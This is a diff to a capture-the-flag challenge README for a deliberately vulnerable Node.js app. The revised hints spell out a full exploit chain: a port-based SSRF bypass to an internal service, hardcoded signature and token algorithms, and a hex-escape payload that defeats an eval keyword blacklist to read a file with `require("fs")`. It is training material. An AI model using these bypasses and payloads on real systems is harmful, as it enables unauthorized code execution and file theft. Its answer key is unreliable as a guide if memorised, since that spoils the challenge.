@@ -6,12 +6,13 @@
 **Skills Required**: SSTI, SSRF, IP Encoding, Token Generation, Blacklist Bypass, JavaScript Exploitation
 
 ## Challenge Description
-You've discovered a web application with multiple vulnerabilities. This challenge requires chaining **4 different vulnerabilities** to reach the flag:
+You've discovered a web application with multiple vulnerabilities. This challenge requires chaining **5 different steps** to reach the flag:
 
-1. **SSTI** (Server-Side Template Injection)
-2. **SSRF** (Server-Side Request Forgery) with IP encoding bypass
-3. **Token Generation** from internal service
-4. **Eval Blacklist Bypass** using encoding techniques
+1. **Discover SSRF** endpoint with signature verification
+2. **Bypass SSRF filters** to access internal service (port-based bypass)
+3. **Reverse-engineer token algorithm** for internal service authentication
+4. **Decode response** from SSRF to extract eval token
+5. **Bypass eval blacklist** using hex escape encoding
 
 **Target**: `http://[CHALLENGE_URL]:3000`
 
@@ -40,9 +41,10 @@ Custom template rendering endpoint.
 #### 4. `/fetch` (GET)
 URL fetcher (SSRF vulnerability).
 - Parameters: `url`, `sig`
-- **Blocks**: `localhost`, `127.0.0.1`, `::1`, private IPs
-- **Allows**: IP encoding bypasses (research this!)
+- **Blocks**: Most localhost representations and private IPs
+- **Special behavior**: Check what happens with different ports
 - Requires MD5 signature: `md5(url + "secret123")[:8]`
+- **Hint**: The blacklist has port-specific rules
 
 #### 5. `/eval` (POST)
 Code evaluation endpoint.
@@ -63,40 +65,49 @@ Internal health check.
 Generates eval tokens for authenticated requests.
 - Parameters: `ts` (timestamp), `token` (auth token)
 - Token algorithm: `sha256("internal_" + timestamp + "_cascade")[:16]`
-- Timestamp must be within 60 seconds
-- Returns: `evalToken` (valid for 5 minutes)
+- Timestamp must be within 60 seconds of current time
+- Returns: Base64-encoded JSON with `evalToken` (valid for 5 minutes)
+- **Important**: Response is base64-encoded, you must decode it
 
 ## Exploitation Chain
 
-### Step 1: SSRF with IP Encoding Bypass
-- `/fetch` blocks `localhost` and `127.0.0.1`
-- Research IP address encoding techniques
-- Hint: What other ways can you represent 127.0.0.1?
+### Step 1: Discover SSRF Endpoint
+- Find the `/fetch` endpoint
+- Calculate MD5 signature: `md5(url + "secret123")[:8]`
+- Test basic requests
 
-### Step 2: Generate Auth Token
-- Internal service requires timestamp + token
-- Figure out the token generation algorithm
-- Hint: Check the `/token` endpoint error messages
+### Step 2: Bypass SSRF Filters
+- `/fetch` has a blacklist for localhost access
+- BUT: There's a special case for port `:3001` (internal service)
+- Research: Does the blacklist treat all ports the same?
+- Hint: Try `localhost:3001` vs `localhost:3000`
 
-### Step 3: Get Eval Token
-- Use SSRF to access `http://[BYPASS]:3001/token`
-- Provide correct timestamp and auth token
-- Receive `evalToken` for `/eval` endpoint
+### Step 3: Generate Auth Token for Internal Service
+- Internal `/token` endpoint requires authentication
+- Algorithm: `sha256("internal_" + timestamp + "_cascade")[:16]`
+- Use current Unix timestamp
+- Must be within 60 seconds of server time
 
-### Step 4: Bypass Eval Blacklist
-- `/eval` blocks many keywords: `require`, `process`, `child_process`, etc.
-- Also blocks encoding patterns: `fromCharCode`, string concatenation, `atob`
+### Step 4: Decode SSRF Response
+- The `/fetch` endpoint returns: `{"url": "...", "statusCode": 200, "data": "base64...", "encoding": "base64"}`
+- You must decode the base64 `data` field to get the actual JSON response
+- The decoded response contains your `evalToken`
+
+### Step 5: Bypass Eval Blacklist
+- `/eval` blocks keywords: `require`, `process`, `child_process`, etc.
+- Also blocks: `fromCharCode`, string concatenation (`+`), `atob`, `btoa`
 - 150 character limit
-- Research: JavaScript string encoding bypasses
-- Hint: There are multiple encoding schemes in JavaScript
+- **Solution**: Use hex escape sequences (`\x??`) to encode blocked keywords
+- Example: `\x72\x65\x71\x75\x69\x72\x65` = "require"
 
 ## Your Mission
 
-Chain all 4 vulnerabilities to read `/tmp/flag.txt`:
-1. Bypass SSRF IP blacklist
-2. Generate auth token for internal service  
-3. Obtain eval token via SSRF
-4. Bypass eval blacklist to read flag
+Chain all 5 steps to read `/tmp/flag.txt`:
+1. Discover `/fetch` endpoint and calculate MD5 signature
+2. Find port-based SSRF bypass for accessing `localhost:3001`
+3. Generate SHA-256 auth token for internal service
+4. Decode base64 response to extract eval token
+5. Use hex escapes to bypass eval blacklist and read flag
 
 ## Hints
 
@@ -110,57 +121,112 @@ Look at the `/render` and `/profile` endpoints. Do they properly sanitize user i
 <details>
 <summary>Hint 2: Accessing Internal Services</summary>
 
-The `/fetch` endpoint can make HTTP requests. But there's signature verification...
+The `/fetch` endpoint can make HTTP requests and requires signature verification.
 
-The signature format is hinted in error messages. Look for MD5 and a secret.
+**Signature format**: `md5(url + "secret123")[:8]`
 
-There's also an internal service running on `localhost:3001` that you can't access directly.
+The internal service runs on `localhost:3001`. The SSRF filter blocks most localhost access...
 
-</details>
+**BUT**: Try accessing different ports. Does the blacklist treat port 3001 specially?
 
-<details>
-<summary>Hint 3: Bypassing the Eval Blacklist</summary>
-
-The `/eval` endpoint blocks dangerous keywords like:
-- `require`
-- `process`
-- `child_process`
-- `Function`
-- `constructor`
-
-But does it check for **encoded** versions of these keywords?
-
-Research: JavaScript hex escape sequences (`\x??`)
+**Hint**: The filter has port-specific rules. `localhost:3000` is blocked, but what about `localhost:3001`?
 
 </details>
 
 <details>
-<summary>Hint 4: The Complete Chain</summary>
+<summary>Hint 3: Token Algorithm</summary>
 
-You need to combine three vulnerabilities:
+The internal `/token` endpoint requires:
+- `ts`: Unix timestamp (current time in seconds)
+- `token`: Authentication token
 
-1. **SSTI** → Discover template injection
-2. **SSRF** → Use it to access internal service (localhost:3001)
-3. **Eval Bypass** → Use encoding to bypass keyword blacklist
-
-The internal service has authentication. Check the error messages for hints about the token algorithm.
-
-</details>
-
-<details>
-<summary>Hint 5: Reading the Flag</summary>
-
-Once you've bypassed the blacklist, you need to:
-1. Access Node.js built-in modules
-2. Read a file from the filesystem
-3. Return the contents
-
-Example structure (blocked directly):
-```javascript
-module.require("fs").readFileSync("/tmp/flag.txt", "utf8")
+**Algorithm hint from error messages**:
+```
+sha256("internal_" + timestamp + "_cascade")[:16]
 ```
 
-Key question: How can you write `require` without triggering the blacklist?
+Example:
+```python
+import hashlib, time
+ts = str(int(time.time()))
+token = hashlib.sha256(f"internal_{ts}_cascade".encode()).hexdigest()[:16]
+```
+
+</details>
+
+<details>
+<summary>Hint 4: Decoding the Response</summary>
+
+When you use SSRF via `/fetch`, the response format is:
+```json
+{
+  "url": "http://localhost:3001/token?...",
+  "statusCode": 200,
+  "data": "eyJ0aW1lc3RhbXA...",  // <-- BASE64 encoded!
+  "encoding": "base64"
+}
+```
+
+You need to:
+1. Extract the `data` field
+2. Decode from base64
+3. Parse the resulting JSON
+4. Extract `evalToken`
+
+</details>
+
+<details>
+<summary>Hint 5: Bypassing the Eval Blacklist</summary>
+
+The `/eval` endpoint blocks dangerous keywords:
+- `require`, `process`, `child_process`, `import`, `Function`, `constructor`
+
+It also blocks encoding patterns:
+- `String.fromCharCode`, `atob`, `btoa`, string concatenation (`"req" + "uire"`)
+
+**BUT**: Hex escape sequences (`\x??`) are NOT blocked!
+
+**Example**: The word "require" can be written as:
+```javascript
+"\x72\x65\x71\x75\x69\x72\x65"
+```
+
+**Full payload structure**:
+```javascript
+module["\x72\x65\x71\x75\x69\x72\x65"]("fs").readFileSync("/tmp/flag.txt","utf8")
+```
+
+Note: `module`, `fs`, and bracket notation `[]` are NOT blocked.
+
+</details>
+
+<details>
+<summary>Hint 6: The Complete Chain (Spoiler Alert!)</summary>
+
+1. **Calculate signature** for SSRF:
+   ```python
+   md5(url + "secret123")[:8]
+   ```
+
+2. **Generate auth token**:
+   ```python
+   sha256("internal_" + timestamp + "_cascade")[:16]
+   ```
+
+3. **SSRF to get eval token**:
+   ```
+   GET /fetch?url=http://localhost:3001/token?ts={timestamp}&token={auth_token}&sig={signature}
+   ```
+
+4. **Decode base64 response** to extract `evalToken`
+
+5. **Bypass eval with hex escapes**:
+   ```json
+   {
+     "code": "module[\"\\x72\\x65\\x71\\x75\\x69\\x72\\x65\"](\"fs\").readFileSync(\"/tmp/flag.txt\",\"utf8\")",
+     "token": "{evalToken}"
+   }
+   ```
 
 </details>
 
@@ -178,16 +244,19 @@ curl -X POST http://localhost:3000/render \
   -d '{"template":"<%= 7*7 %>"}'
 ```
 
-### Test 3: SSRF (needs signature)
+### Test 3: SSRF (with signature)
 ```bash
-curl "http://localhost:3000/fetch?url=http://localhost:3001/health&sig=???"
+# Calculate signature: md5("http://localhost:3001/health" + "secret123")[:8]
+# Result: 4427720f
+
+curl "http://localhost:3000/fetch?url=http://localhost:3001/health&sig=4427720f"
 ```
 
-### Test 4: Eval (needs bypass)
+### Test 4: Eval (needs token from internal service)
 ```bash
 curl -X POST http://localhost:3000/eval \
   -H "Content-Type: application/json" \
-  -d '{"code":"1+1"}'
+  -d '{"code":"1+1", "token":"eval_..."}'
 ```
 
 ## Rate Limiting
@@ -222,17 +291,18 @@ MEDUSA2{...}
 ## Resources
 
 If you're stuck, research these topics:
-- EJS template injection
-- SSRF with localhost
-- JavaScript hex escape sequences
-- Node.js module system
+- SSRF with port-based filter bypass
+- JavaScript hex escape sequences (`\x??` notation)
+- Node.js module system and `module` object
 - MD5 hash calculation
-- SHA-256 hash calculation
+- SHA-256 hash calculation  
+- Base64 encoding/decoding
+- Unix timestamps
 
 ## Time Estimate
 
-- **Beginner-Intermediate**: 60-90 minutes
-- **Intermediate**: 30-45 minutes
-- **Advanced**: 15-30 minutes
+- **Beginner**: 90-120 minutes (with hints)
+- **Intermediate**: 45-60 minutes
+- **Advanced**: 20-30 minutes
 
 Good luck! 🚩
